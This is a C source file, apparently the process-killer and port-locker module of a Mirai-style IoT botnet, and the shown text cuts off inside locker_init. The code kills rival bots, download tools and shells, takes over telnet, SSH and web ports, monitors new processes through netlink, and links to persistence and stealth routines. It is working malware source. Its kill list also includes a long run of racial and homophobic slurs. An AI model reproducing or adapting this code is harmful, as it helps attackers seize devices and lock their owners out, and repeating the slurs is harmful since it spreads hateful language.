#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>
#include <poll.h>
#include <linux/limits.h>
#include <linux/cn_proc.h>
#include <linux/connector.h>
#include <linux/netlink.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"
#include "tcp.h"
#include "persistence.h"
#include "stealth.h"

#define MAX_PATH_LENGTH 256
#define MAX_CMD_LENGTH  512

#define SEND_MESSAGE_LEN (NLMSG_LENGTH(sizeof(struct cn_msg) + sizeof(enum proc_cn_mcast_op)))
#define RECV_MESSAGE_LEN (NLMSG_LENGTH(sizeof(struct cn_msg) + sizeof(struct proc_event)))
#define SEND_MESSAGE_SIZE (NLMSG_SPACE(SEND_MESSAGE_LEN))
#define RECV_MESSAGE_SIZE (NLMSG_SPACE(RECV_MESSAGE_LEN))
#define MAX(a, b) ((a) > (b) ? (a) : (b))
#define BUFF_SIZE (MAX(MAX(SEND_MESSAGE_SIZE, RECV_MESSAGE_SIZE), 1024))

static int locker_pid = -1;
static int telnet_socket = -1;
static int netlink_fd = -1;


#define MAX_LOCKED_PORTS 20  
static int locked_ports[MAX_LOCKED_PORTS] = {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1};
static uint16_t ports_to_lock[MAX_LOCKED_PORTS];
static int num_ports_to_lock = 0;




static void init_default_ports(void) {
    if (num_ports_to_lock > 0) return; 
    
    
    ports_to_lock[0] = 23;      
    num_ports_to_lock = 1;
}

static char killer_realpath[PATH_MAX] = {0};
static int killer_realpath_len = 0;
static pid_t our_pid = 0;
static pid_t our_ppid = 0;
static ino_t locker_inode = 0;      
static dev_t locker_device = 0;     


static inline BOOL is_watchdog_process(const char *path, const char *cmdline) {
    if (path == NULL && cmdline == NULL)
        return FALSE;
    
    const char *check_str = path ? path : cmdline;
    if (check_str == NULL)
        return FALSE;
    
    
    char lower_check[512];
    int len = strlen(check_str);
    if (len >= sizeof(lower_check))
        len = sizeof(lower_check) - 1;
    
    for (int i = 0; i < len; i++) {
        lower_check[i] = (check_str[i] >= 'A' && check_str[i] <= 'Z') ? 
                         check_str[i] + 32 : check_str[i];
    }
    lower_check[len] = '\0';
    
    
    const char *watchdog_patterns[] = {
        "watchdog",
        "watchdogd",
        "watchdog.bin",
        "watchdog.elf",
        "wdt",
        "wdt.bin",
        "wdt.elf",
        "wdtdaemon",
        "watchdogd.bin",
        "watchdogd.elf",
        "/sbin/watchdog",
        "/usr/sbin/watchdog",
        "/bin/watchdog",
        "/usr/bin/watchdog"
    };
    
    for (int i = 0; i < sizeof(watchdog_patterns) / sizeof(watchdog_patterns[0]); i++) {
        if (strstr(lower_check, watchdog_patterns[i]) != NULL) {
            return TRUE;
        }
    }
    
    return FALSE;
}


static inline BOOL is_critical_system_process(const char *cmdline) {
    if (cmdline == NULL || strlen(cmdline) == 0)
        return TRUE; 
    
    
    if (is_watchdog_process(NULL, cmdline)) {
        return TRUE;
    }
    
    const char *critical_patterns[] = {
        "init",
        "systemd",
        "watchdog",  
        "kthreadd",
        "ksoftirqd",
        "migration",
        "rcu_",
        "kswapd",
        "kworker",
        "khelper",
        "/lib/",
        "/usr/lib/",
        "/usr/bin/",
        "/usr/sbin/",
        "/sbin/",
        "/bin/",
        "/etc/",
        "/proc/",
        "/sys/",
        "/dev/",
        "/var/lib/",
        "/usr/local/",
        "/opt/"
    };
    
    for (int i = 0; i < sizeof(critical_patterns) / sizeof(critical_patterns[0]); i++) {
        if (strstr(cmdline, critical_patterns[i]) != NULL)
            return TRUE;
    }
    
    return FALSE;
}

static inline void lock_device(void) {
    DIR *dir;
    struct dirent *file;
    char path[MAX_PATH_LENGTH];

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((file = readdir(dir))) {
        int pid = atoi(file->d_name);
        if (pid == locker_pid || pid == our_pid || pid == our_ppid || pid == 0 || pid == 1)
            continue;

        snprintf(path, sizeof(path), "/proc/%s/cmdline", file->d_name);
            
        FILE *cmdfile = fopen(path, "r");
        if (cmdfile != NULL) {
            char cmdline[MAX_PATH_LENGTH];
            if (fgets(cmdline, sizeof(cmdline), cmdfile) != NULL) {
                
                if (is_critical_system_process(cmdline))
                    continue;
                
                
                
                BOOL should_kill = FALSE;
                
                
                
                if (strstr(cmdline, "wget") && strstr(cmdline, "/usr/bin/") == NULL && 
                    strstr(cmdline, "/bin/") == NULL && strstr(cmdline, "/sbin/") == NULL) {
                    should_kill = TRUE;
                }
                if (!should_kill && strstr(cmdline, "curl") && strstr(cmdline, "/usr/bin/") == NULL && 
                    strstr(cmdline, "/bin/") == NULL && strstr(cmdline, "/sbin/") == NULL) {
                    should_kill = TRUE;
                }
                
                
                if (!should_kill && (strstr(cmdline, "bash") || strstr(cmdline, "sh")) && 
                    strstr(cmdline, "/usr/bin/") == NULL && strstr(cmdline, "/bin/") == NULL &&
                    strstr(cmdline, "/sbin/") == NULL && strstr(cmdline, "-c") == NULL) {
                    should_kill = TRUE;
                }
                
                
                if (!should_kill && (strstr(cmdline, "reboot") || strstr(cmdline, "shutdown") || 
                    strstr(cmdline, "halt") || strstr(cmdline, "poweroff")) &&
                    strstr(cmdline, "/usr/bin/") == NULL && strstr(cmdline, "/bin/") == NULL &&
                    strstr(cmdline, "/sbin/") == NULL) {
                    should_kill = TRUE;
                }
                
                if (should_kill) {
                    kill(pid, 9);
                }
            }

            fclose(cmdfile);
        }
    }

    closedir(dir);
}

static inline int is_our_process_family(int pid) {
    if (pid == our_pid || pid == our_ppid) {
        return TRUE;
    }
    
    char status_path[64];
    char rdbuf[256];
    
    char *p = status_path;
    memcpy(p, "/proc/", 6);
    p += 6;
    
    char pid_str[16];
    util_itoa(pid, 10, pid_str);
    const char *ps = pid_str;
    while (*ps) *p++ = *ps++;
    memcpy(p, "/status", 8);
    
    int fd = open(status_path, O_RDONLY);
    if (fd == -1) {
        return FALSE;
    }
    
    int len = read(fd, rdbuf, sizeof(rdbuf) - 1);
    close(fd);
    
    if (len <= 0) {
        return FALSE;
    }
    rdbuf[len] = '\0';
    
    char *ppid_line = strstr(rdbuf, "PPid:");
    if (ppid_line != NULL) {
        int ppid = atoi(ppid_line + 5);
        if (ppid == our_ppid) {
            return TRUE;
        }
    }
    
    return FALSE;
}

static inline int hold_port(uint16_t port) {
    struct sockaddr_in addr;
    int sock;
    int reuse = 1;
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) < 0) {
        
    }
    
    util_zero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }

    if (listen(sock, 1) < 0) {
        close(sock);
        return -1;
    }
    
    return sock;
}


static inline int hold_telnet_port(void) {
    return hold_port(23);
}


static inline BOOL is_port_already_locked(uint16_t port) {
    for (int i = 0; i < num_ports_to_lock; i++) {
        if (ports_to_lock[i] == port) {
            return TRUE;
        }
    }
    return FALSE;
}


static inline void add_port_to_lock(uint16_t port) {
    if (is_port_already_locked(port)) {
        return; 
    }
    
    if (num_ports_to_lock >= MAX_LOCKED_PORTS) {
        #ifdef DEBUG
            printf("[locker] Cannot add port %d - max ports reached\n", port);
        #endif
        return;
    }
    
    ports_to_lock[num_ports_to_lock++] = port;
    #ifdef DEBUG
        printf("[locker] Added port %d to lock list (total: %d)\n", port, num_ports_to_lock);
    #endif
}



static inline int detect_bot_listening_ports(uint16_t *found_ports, int max_ports) {
    char net_tcp_path[64] = "/proc/net/tcp";
    FILE *net_tcp_file;
    char line[512];
    int found_count = 0;
    pid_t bot_pid = our_ppid; 
    
    if (bot_pid <= 0) {
        bot_pid = getppid(); 
    }
    
    if (bot_pid <= 0) {
        return 0; 
    }
    
    
    char fd_dir_path[64];
    snprintf(fd_dir_path, sizeof(fd_dir_path), "/proc/%d/fd", (int)bot_pid);
    DIR *fd_dir = opendir(fd_dir_path);
    if (fd_dir == NULL) {
        return 0; 
    }
    
    
    ino_t bot_socket_inodes[64];
    int bot_inode_count = 0;
    
    struct dirent *fd_file;
    while ((fd_file = readdir(fd_dir)) != NULL && bot_inode_count < 64) {
        if (fd_file->d_name[0] == '.') continue;
        
        char fd_link[128];
        snprintf(fd_link, sizeof(fd_link), "%s/%s", fd_dir_path, fd_file->d_name);
        
        char fd_target[256];
        ssize_t fd_len = readlink(fd_link, fd_target, sizeof(fd_target) - 1);
        if (fd_len > 0) {
            fd_target[fd_len] = '\0';
            if (strstr(fd_target, "socket:[") != NULL) {
                char inode_str[32];
                if (sscanf(fd_target, "socket:[%31[^]]", inode_str) == 1) {
                    bot_socket_inodes[bot_inode_count++] = (ino_t)strtoul(inode_str, NULL, 10);
                }
            }
        }
    }
    closedir(fd_dir);
    
    if (bot_inode_count == 0) {
        return 0; 
    }
    
    
    net_tcp_file = fopen(net_tcp_path, "r");
    if (net_tcp_file == NULL) {
        return 0;
    }
    
    
    if (fgets(line, sizeof(line), net_tcp_file) != NULL) {
        while (fgets(line, sizeof(line), net_tcp_file) != NULL && found_count < max_ports) {
            
            
            char *last_space = strrchr(line, ' ');
            if (last_space == NULL) continue;
            
            ino_t line_inode = (ino_t)strtoul(last_space + 1, NULL, 10);
            
            
            BOOL is_bot_socket = FALSE;
            for (int i = 0; i < bot_inode_count; i++) {
                if (bot_socket_inodes[i] == line_inode) {
                    is_bot_socket = TRUE;
                    break;
                }
            }
            
            if (!is_bot_socket) continue;
            
            
            
            char *local_addr = strtok(line, " ");
            if (local_addr == NULL) continue;
            
            
            char *colon = strchr(local_addr, ':');
            if (colon == NULL) continue;
            
            
            char port_hex[8];
            int port_hex_len = 0;
            colon++; 
            while (*colon != '\0' && *colon != ' ' && port_hex_len < 7) {
                port_hex[port_hex_len++] = *colon++;
            }
            port_hex[port_hex_len] = '\0';
            
            
            uint16_t port = (uint16_t)strtoul(port_hex, NULL, 16);
            port = ntohs(port); 
            
            
            BOOL already_found = FALSE;
            for (int i = 0; i < found_count; i++) {
                if (found_ports[i] == port) {
                    already_found = TRUE;
                    break;
                }
            }
            
            if (!already_found && port > 0) {
                found_ports[found_count++] = port;
            }
        }
    }
    
    fclose(net_tcp_file);
    return found_count;
}


static inline BOOL is_port_used_by_bot(uint16_t port) {
    
    if (our_ppid <= 0) {
        our_ppid = getppid(); 
        if (our_ppid <= 0) {
            return FALSE; 
        }
    }
    
    uint16_t bot_ports[16];
    int count = detect_bot_listening_ports(bot_ports, 16);
    
    for (int i = 0; i < count; i++) {
        if (bot_ports[i] == port) {
            return TRUE;
        }
    }
    return FALSE;
}


static inline void kill_port_processes(uint16_t port);




void secure_port_for_bot(uint16_t port) {
    
    if (is_port_used_by_bot(port)) {
        #ifdef DEBUG
            printf("[locker] Bot is running on port %d, adding to lock list\n", port);
        #endif
        
        add_port_to_lock(port);
        
        
        BOOL already_bound = FALSE;
        for (int i = 0; i < num_ports_to_lock && i < MAX_LOCKED_PORTS; i++) {
            if (ports_to_lock[i] == port && locked_ports[i] >= 0) {
                already_bound = TRUE;
                break;
            }
        }
        
        if (!already_bound) {
            
            for (int i = 0; i < MAX_LOCKED_PORTS; i++) {
                if (locked_ports[i] < 0) {
                    locked_ports[i] = hold_port(port);
                    if (locked_ports[i] >= 0) {
                        #ifdef DEBUG
                            printf("[locker] Successfully bound to bot's port %d\n", port);
                        #endif
                    }
                    break;
                }
            }
        }
    } else {
        #ifdef DEBUG
            printf("[locker] Bot is NOT running on port %d, attempting takeover\n", port);
        #endif
        
        kill_port_processes(port);
        usleep(5000); 
        
        
        add_port_to_lock(port);
        
        
        for (int i = 0; i < MAX_LOCKED_PORTS; i++) {
            if (locked_ports[i] < 0) {
                locked_ports[i] = hold_port(port);
                if (locked_ports[i] >= 0) {
                    #ifdef DEBUG
                        printf("[locker] Successfully took over port %d\n", port);
                    #endif
                } else {
                    #ifdef DEBUG
                        printf("[locker] Failed to take over port %d, retrying...\n", port);
                    #endif
                    
                    kill_port_processes(port);
                    usleep(2000);
                    locked_ports[i] = hold_port(port);
                }
                break;
            }
        }
    }
}

static inline void kill_port_processes(uint16_t port) {
    
    DIR *dir;
    struct dirent *file;
    char path[MAX_PATH_LENGTH];
    char exe_path[MAX_PATH_LENGTH];
    char cmdline[MAX_PATH_LENGTH];
    char port_hex[8];
    char net_tcp_path[64];
    FILE *net_tcp_file;
    char line[512];
    ino_t target_inode = 0;

    
    snprintf(port_hex, sizeof(port_hex), "%04X", ntohs(htons(port)));
    
    
    snprintf(net_tcp_path, sizeof(net_tcp_path), "/proc/net/tcp");
    net_tcp_file = fopen(net_tcp_path, "r");
    if (net_tcp_file != NULL) {
        
        if (fgets(line, sizeof(line), net_tcp_file) != NULL) {
            while (fgets(line, sizeof(line), net_tcp_file) != NULL) {
                
                
                if (strstr(line, port_hex) != NULL) {
                    
                    char *last_space = strrchr(line, ' ');
                    if (last_space != NULL) {
                        target_inode = (ino_t)strtoul(last_space + 1, NULL, 10);
                        break;
                    }
                }
            }
        }
        fclose(net_tcp_file);
    }

    dir = opendir("/proc/");
    if (dir == NULL)
        return;

    while ((file = readdir(dir))) {
        int pid = atoi(file->d_name);
        if (pid == locker_pid || pid == our_pid || pid == our_ppid || pid == 0 || pid == 1)
            continue;

        if (pid > 0) {
            snprintf(path, sizeof(path), "/proc/%s/exe", file->d_name);
            ssize_t len = readlink(path, exe_path, sizeof(exe_path) - 1);
            if (len == -1)
                continue;
            exe_path[len] = '\0';

            
            char exe_path_clean[256];
            strncpy(exe_path_clean, exe_path, sizeof(exe_path_clean) - 1);
            exe_path_clean[sizeof(exe_path_clean) - 1] = '\0';
            char *deleted_pos = strstr(exe_path_clean, " (deleted)");
            if (deleted_pos != NULL) {
                *deleted_pos = '\0';
            }
            
            
            BOOL is_our_process = FALSE;
            
            
            if (killer_realpath_len > 0 && len == killer_realpath_len && 
                memcmp(exe_path_clean, killer_realpath, killer_realpath_len) == 0) {
                is_our_process = TRUE;
            }
            
            
            if (!is_our_process) {
                const char *persistent = get_persistent_path();
                if (persistent != NULL && len == (int)strlen(persistent) && 
                    memcmp(exe_path_clean, persistent, len) == 0) {
                    is_our_process = TRUE;
                }
            }
            
            
            if (!is_our_process && locker_inode != 0 && locker_device != 0) {
                struct stat proc_stat;
                if (stat(exe_path_clean, &proc_stat) == 0) {
                    if (proc_stat.st_ino == locker_inode && proc_stat.st_dev == locker_device) {
                        is_our_process = TRUE;
                    }
                }
            }
            
            if (is_our_process) {
                continue; 
            }

            
            if (target_inode != 0) {
                char fd_dir_path[64];
                snprintf(fd_dir_path, sizeof(fd_dir_path), "/proc/%s/fd", file->d_name);
                DIR *fd_dir = opendir(fd_dir_path);
                if (fd_dir != NULL) {
                    struct dirent *fd_file;
                    while ((fd_file = readdir(fd_dir))) {
                        if (fd_file->d_name[0] == '.')
                            continue;
                        char fd_link[64];
                        snprintf(fd_link, sizeof(fd_link), "%s/%s", fd_dir_path, fd_file->d_name);
                        char fd_target[256];
                        ssize_t fd_len = readlink(fd_link, fd_target, sizeof(fd_target) - 1);
                        if (fd_len > 0) {
                            fd_target[fd_len] = '\0';
                            
                            if (strstr(fd_target, "socket:[") != NULL) {
                                char inode_str[32];
                                sscanf(fd_target, "socket:[%31[^]]", inode_str);
                                ino_t fd_inode = (ino_t)strtoul(inode_str, NULL, 10);
                                if (fd_inode == target_inode) {
                                    kill(pid, 9);
                                    closedir(fd_dir);
                                    break;
                                }
                            }
                        }
                    }
                    closedir(fd_dir);
                }
            }

            
            snprintf(path, sizeof(path), "/proc/%s/cmdline", file->d_name);
            FILE *cmdfile = fopen(path, "r");
            if (cmdfile != NULL) {
                if (fgets(cmdline, sizeof(cmdline), cmdfile) != NULL) {
                    
                    if (port == 23 && (strstr(exe_path, "telnetd") || strstr(cmdline, "telnetd"))) {
                        kill(pid, 9);
                    } else if (port == 22 && (strstr(exe_path, "sshd") || strstr(cmdline, "sshd"))) {
                        
                        if (strstr(exe_path, "/usr/sbin/") == NULL && strstr(exe_path, "/sbin/") == NULL) {
                            kill(pid, 9);
                        }
                    } else if ((port == 80 || port == 81 || port == 8080 || port == 8000) && 
                               (strstr(exe_path, "httpd") || strstr(exe_path, "lighttpd") || 
                                strstr(exe_path, "nginx") || strstr(exe_path, "goahead") ||
                                strstr(cmdline, "httpd") || strstr(cmdline, "lighttpd") ||
                                strstr(cmdline, "nginx") || strstr(cmdline, "goahead"))) {
                        
                        if (strstr(exe_path, "/usr/sbin/") == NULL && 
                            strstr(exe_path, "/sbin/") == NULL &&
                            strstr(exe_path, "/usr/bin/") == NULL) {
                            kill(pid, 9);
                        }
                    }
                }
                fclose(cmdfile);
            }
        }
    }

    closedir(dir);
}


static inline void kill_telnet_processes(void) {
    kill_port_processes(23);
}

static inline BOOL exe_access(void) {
    char path[64];
    int fd;
    char x[16];

    our_pid = getpid();
    our_ppid = getppid();

    util_itoa(our_pid, 10, x);
    
    char *p = path;
    memcpy(p, "/proc/", 6);
    p += 6;
    const char *xs = x;
    while (*xs) *p++ = *xs++;
    memcpy(p, "/exe", 5);

    if ((fd = open(path, O_RDONLY)) == -1) {
        return FALSE;
    }
    close(fd);

    if ((killer_realpath_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1) {
        killer_realpath[killer_realpath_len] = '\0';
        
        char *deleted_pos = strstr(killer_realpath, " (deleted)");
        if (deleted_pos != NULL) {
            *deleted_pos = '\0';
            killer_realpath_len = strlen(killer_realpath);
        }
        
        
        
        struct stat self_stat;
        if (stat(killer_realpath, &self_stat) == 0) {
            locker_inode = self_stat.st_ino;
            locker_device = self_stat.st_dev;
        }
    } else {
        killer_realpath_len = 0;
        return FALSE;
    }
    
    return TRUE;
}

static inline BOOL send_netlink_message(int fd, enum proc_cn_mcast_op op) {
    char buff[SEND_MESSAGE_SIZE];
    util_zero(buff, sizeof(buff));

    struct nlmsghdr *nl_hdr = (struct nlmsghdr *)buff;
    struct cn_msg *cn_hdr = (struct cn_msg *)(buff + sizeof(struct nlmsghdr));
    enum proc_cn_mcast_op *mcop_msg =
        (enum proc_cn_mcast_op *)(buff + sizeof(struct nlmsghdr) + sizeof(struct cn_msg));

    nl_hdr->nlmsg_len = SEND_MESSAGE_LEN;
    nl_hdr->nlmsg_type = NLMSG_DONE;
    nl_hdr->nlmsg_flags = 0;
    nl_hdr->nlmsg_seq = 0;
    nl_hdr->nlmsg_pid = getpid();

    cn_hdr->id.idx = CN_IDX_PROC;
    cn_hdr->id.val = CN_VAL_PROC;
    cn_hdr->seq = 0;
    cn_hdr->ack = 0;
    cn_hdr->len = sizeof(enum proc_cn_mcast_op);

    *mcop_msg = op;

    if (send(fd, nl_hdr, nl_hdr->nlmsg_len, 0) == -1) {
        return FALSE;
    }

    return TRUE;
}

static inline void locker_handle_exec(const char *pid_str, pid_t i_pid) {
    if (is_our_process_family(i_pid)) {
        return;
    }

    char path_buf[64];
    char exe[PATH_MAX];
    char cmdline[PATH_MAX];

    char *p = path_buf;
    memcpy(p, "/proc/", 6);
    p += 6;
    const char *pn = pid_str;
    while (*pn) *p++ = *pn++;
    memcpy(p, "/exe", 5);

    int exe_len = readlink(path_buf, exe, PATH_MAX - 1);
    if (exe_len == -1) {
        return;
    }
    exe[exe_len] = '\0';

    
    char exe_clean[PATH_MAX];
    strncpy(exe_clean, exe, sizeof(exe_clean) - 1);
    exe_clean[sizeof(exe_clean) - 1] = '\0';
    char *deleted_pos = strstr(exe_clean, " (deleted)");
    if (deleted_pos != NULL) {
        *deleted_pos = '\0';
    }
    
    
    
    
    BOOL is_our_process = FALSE;
    
    
    if (killer_realpath_len > 0 && exe_len == killer_realpath_len && 
        memcmp(exe_clean, killer_realpath, killer_realpath_len) == 0) {
        is_our_process = TRUE;
    }
    
    
    if (!is_our_process) {
        const char *persistent = get_persistent_path();
        if (persistent != NULL && exe_len == (int)strlen(persistent) && 
            memcmp(exe_clean, persistent, exe_len) == 0) {
            is_our_process = TRUE;
        }
    }
    
    
    if (!is_our_process && locker_inode != 0 && locker_device != 0) {
        struct stat proc_stat;
        if (stat(exe_clean, &proc_stat) == 0) {
            
            if (proc_stat.st_ino == locker_inode && proc_stat.st_dev == locker_device) {
                is_our_process = TRUE;
            }
        }
    }
    
    if (is_our_process) {
        return; 
    }

    p = path_buf;
    memcpy(p, "/proc/", 6);
    p += 6;
    pn = pid_str;
    while (*pn) *p++ = *pn++;
    memcpy(p, "/cmdline", 9);
    
    int cmd_fd = open(path_buf, O_RDONLY);
    int cmdline_len = 0;
    if (cmd_fd != -1) {
        cmdline_len = read(cmd_fd, cmdline, PATH_MAX - 1);
        close(cmd_fd);
        if (cmdline_len > 0) {
            cmdline[cmdline_len] = '\0';
        }
    }

    
    if (is_critical_system_process(cmdline_len > 0 ? cmdline : exe))
        return;
    
    
    if (stealth_is_hidden_process(exe_len > 0 ? exe : NULL, cmdline_len > 0 ? cmdline : NULL)) {
        kill(i_pid, 9);
        return;
    }
    
    
    if (exe_len > 0 && cmdline_len > 0 && stealth_has_mismatch(exe, cmdline)) {
        kill(i_pid, 9);
        return;
    }
    
    BOOL should_kill = FALSE;
    
    
    const char *check_str = exe;
    if (check_str == NULL && cmdline_len > 0)
        check_str = cmdline;
    
    if (check_str != NULL) {
        char lower_check[512];
        int len = strlen(check_str);
        if (len >= sizeof(lower_check))
            len = sizeof(lower_check) - 1;
        
        for (int i = 0; i < len; i++) {
            lower_check[i] = (check_str[i] >= 'A' && check_str[i] <= 'Z') ? 
                             check_str[i] + 32 : check_str[i];
        }
        lower_check[len] = '\0';
        
        
        
        if (is_watchdog_process(exe, cmdline_len > 0 ? cmdline : NULL)) {
            
            should_kill = FALSE;
        } else {
        const char *competing_bots[] = {
            "mirai",
            "qbot",
            "gafgyt",
            "tsunami",
            "bashlite",
            "aidra",
            ".bin",
            ".elf"
        };
        
        for (int i = 0; i < sizeof(competing_bots) / sizeof(competing_bots[0]); i++) {
            if (strstr(lower_check, competing_bots[i]) != NULL) {
                    
                    if (!is_critical_system_process(check_str) && 
                        !is_watchdog_process(exe, cmdline_len > 0 ? cmdline : NULL)) {
                    should_kill = TRUE;
                    break;
                    }
                }
            }
        }
    }
    
    
    if (!should_kill && strstr(exe, "telnetd") && strstr(exe, "/usr/sbin/") == NULL && 
        strstr(exe, "/sbin/") == NULL && strstr(exe, "/bin/") == NULL) {
        should_kill = TRUE;
    }
    if (!should_kill && cmdline_len > 0 && strstr(cmdline, "telnetd") && 
        strstr(cmdline, "/usr/sbin/") == NULL && strstr(cmdline, "/sbin/") == NULL) {
        should_kill = TRUE;
    }

    
    if (!should_kill && (strstr(exe, "wget") || strstr(exe, "curl")) && 
        strstr(exe, "/usr/bin/") == NULL && strstr(exe, "/bin/") == NULL &&
        strstr(exe, "/sbin/") == NULL) {
        should_kill = TRUE;
    }
    if (!should_kill && cmdline_len > 0 && (strstr(cmdline, "wget") || strstr(cmdline, "curl")) &&
        strstr(cmdline, "/usr/bin/") == NULL && strstr(cmdline, "/bin/") == NULL &&
        strstr(cmdline, "/sbin/") == NULL) {
        should_kill = TRUE;
    }

    
    if (!should_kill && (strstr(exe, "sh") || strstr(exe, "bash")) && 
        strstr(exe, "/usr/bin/") == NULL && strstr(exe, "/bin/") == NULL &&
        strstr(exe, "/sbin/") == NULL && cmdline_len > 0 && strstr(cmdline, "-c") == NULL) {
        should_kill = TRUE;
    }

    if (should_kill) {
        kill(i_pid, 9);
    }
}

static int proc_filter(const struct dirent *entry) {
    char c = *(entry->d_name);
    return (c >= '0' && c <= '9');
}

static inline void locker_proc(void) {
    struct dirent **namelist;
    int n;
    char exe[PATH_MAX];
    char cmdline[PATH_MAX];
    char path_buf[64];

    n = scandir("/proc/", &namelist, proc_filter, NULL);
    if (n < 0) {
        return;
    }

    for (int i = 0; i < n; i++) {
        int i_pid = atoi(namelist[i]->d_name);
        const char *pid_name = namelist[i]->d_name;
        
        if (is_our_process_family(i_pid)) {
            free(namelist[i]);
            continue;
        }

        char *p = path_buf;
        memcpy(p, "/proc/", 6);
        p += 6;
        const char *pn = pid_name;
        while (*pn) *p++ = *pn++;
        memcpy(p, "/exe", 5);

        int exe_len = readlink(path_buf, exe, PATH_MAX - 1);
        if (exe_len == -1) {
            free(namelist[i]);
            continue;
        }
        exe[exe_len] = '\0';

        
        char exe_clean[PATH_MAX];
        strncpy(exe_clean, exe, sizeof(exe_clean) - 1);
        exe_clean[sizeof(exe_clean) - 1] = '\0';
        char *deleted_pos = strstr(exe_clean, " (deleted)");
        if (deleted_pos != NULL) {
            *deleted_pos = '\0';
        }
        
        
        
        
        BOOL is_our_process = FALSE;
        
        
        if (killer_realpath_len > 0 && exe_len == killer_realpath_len && 
            memcmp(exe_clean, killer_realpath, killer_realpath_len) == 0) {
            is_our_process = TRUE;
        }
        
        
        if (!is_our_process) {
            const char *persistent = get_persistent_path();
            if (persistent != NULL && exe_len == (int)strlen(persistent) && 
                memcmp(exe_clean, persistent, exe_len) == 0) {
                is_our_process = TRUE;
            }
        }
        
        
        if (!is_our_process && locker_inode != 0 && locker_device != 0) {
            struct stat proc_stat;
            if (stat(exe_clean, &proc_stat) == 0) {
                
                if (proc_stat.st_ino == locker_inode && proc_stat.st_dev == locker_device) {
                    is_our_process = TRUE;
                }
            }
        }
        
        if (is_our_process) {
            free(namelist[i]);
            continue; 
        }

        p = path_buf;
        memcpy(p, "/proc/", 6);
        p += 6;
        pn = pid_name;
        while (*pn) *p++ = *pn++;
        memcpy(p, "/cmdline", 9);
        
        int cmd_fd = open(path_buf, O_RDONLY);
        int cmdline_len = 0;
        if (cmd_fd != -1) {
            cmdline_len = read(cmd_fd, cmdline, PATH_MAX - 1);
            close(cmd_fd);
            if (cmdline_len > 0) {
                cmdline[cmdline_len] = '\0';
            }
        }

        
        if (is_critical_system_process(cmdline_len > 0 ? cmdline : exe)) {
            free(namelist[i]);
            continue;
        }
        
        
        if (stealth_is_hidden_process(exe_len > 0 ? exe : NULL, cmdline_len > 0 ? cmdline : NULL)) {
            kill(i_pid, 9);
            free(namelist[i]);
            continue;
        }
        
        
        if (exe_len > 0 && cmdline_len > 0 && stealth_has_mismatch(exe, cmdline)) {
            kill(i_pid, 9);
            free(namelist[i]);
            continue;
        }
        
        BOOL should_kill = FALSE;
        
        
        const char *check_str = exe;
        if (check_str == NULL && cmdline_len > 0)
            check_str = cmdline;
        
        if (check_str != NULL) {
            char lower_check[512];
            int len = strlen(check_str);
            if (len >= sizeof(lower_check))
                len = sizeof(lower_check) - 1;
            
            for (int j = 0; j < len; j++) {
                lower_check[j] = (check_str[j] >= 'A' && check_str[j] <= 'Z') ? 
                                 check_str[j] + 32 : check_str[j];
            }
            lower_check[len] = '\0';
            
            
            
            if (is_watchdog_process(exe, cmdline_len > 0 ? cmdline : NULL)) {
                
                should_kill = FALSE;
            } else {
            const char *competing_bots[] = {
                "mirai",
                "qbot",
                "gafgyt",
                "tsunami",
                "bashlite",
                "aidra",
                ".bin",
                ".elf",
                
                "nigger",
                "nigga",
                "n1gg3r",
                "n1gga",
                "n1gger",
                "n1gga",
                "nigg3r",
                "nigg4",
                "chink",
                "gook",
                "spic",
                "wetback",
                "towelhead",
                "sandnigger",
                "sandnigga",
                "raghead",
                "paki",
                "kike",
                "kyke",
                "jap",
                "gyp",
                "zipperhead",
                "slant",
                "chinkie",
                "gooker",
                
                "goon",
                "nig",
                "fag",
                "faggot",
                "retard",
                "retarded"
            };
            
            for (int j = 0; j < sizeof(competing_bots) / sizeof(competing_bots[0]); j++) {
                if (strstr(lower_check, competing_bots[j]) != NULL) {
                        
                        if (!is_critical_system_process(check_str) && 
                            !is_watchdog_process(exe, cmdline_len > 0 ? cmdline : NULL)) {
                        should_kill = TRUE;
                        break;
                        }
                    }
                }
            }
        }
        
        
        if (!should_kill && strstr(exe, "telnetd") && strstr(exe, "/usr/sbin/") == NULL && 
            strstr(exe, "/sbin/") == NULL && strstr(exe, "/bin/") == NULL) {
            should_kill = TRUE;
        }
        if (!should_kill && cmdline_len > 0 && strstr(cmdline, "telnetd") && 
            strstr(cmdline, "/usr/sbin/") == NULL && strstr(cmdline, "/sbin/") == NULL) {
            should_kill = TRUE;
        }

        
        if (!should_kill && (strstr(exe, "wget") || strstr(exe, "curl")) && 
            strstr(exe, "/usr/bin/") == NULL && strstr(exe, "/bin/") == NULL &&
            strstr(exe, "/sbin/") == NULL) {
            should_kill = TRUE;
        }
        if (!should_kill && cmdline_len > 0 && (strstr(cmdline, "wget") || strstr(cmdline, "curl")) &&
            strstr(cmdline, "/usr/bin/") == NULL && strstr(cmdline, "/bin/") == NULL &&
            strstr(cmdline, "/sbin/") == NULL) {
            should_kill = TRUE;
        }

        
        if (!should_kill && (strstr(exe, "sh") || strstr(exe, "bash")) && 
            strstr(exe, "/usr/bin/") == NULL && strstr(exe, "/bin/") == NULL &&
            strstr(exe, "/sbin/") == NULL && cmdline_len > 0 && strstr(cmdline, "-c") == NULL) {
            should_kill = TRUE;
        }

        if (should_kill) {
            kill(i_pid, 9);
        }
        
        free(namelist[i]);
    }

    free(namelist);
}

void locker_init(void) {
    int pipefd[2];

    if (pipe(pipefd) == -1) {
        exit(0);
    }

    int pid = fork();

    if (pid > 0) {
        close(pipefd[1]);
        read(pipefd[0], &locker_pid, sizeof(locker_pid));
        close(pipefd[0]);
        return;
